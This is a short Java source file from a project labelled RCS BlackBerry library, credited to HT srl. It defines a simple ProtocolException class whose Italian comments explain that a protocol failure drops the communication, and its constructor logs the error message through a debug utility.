/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ProtocolException.java 
 * Created      : 6-apr-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

/**
 * The Class ProtocolException. Viene lanciato in caso di eccezione durante
 * l'esecuzione di un protocollo. Come effetto fa cadere la comunicazione.
 */
public class ProtocolException extends Exception {
	//#debug
    static Debug debug = new Debug("ProtocolException", DebugLevel.VERBOSE);

    public ProtocolException(String string) {
        super(string);
        // #debug
        debug.error(string);
    }
}
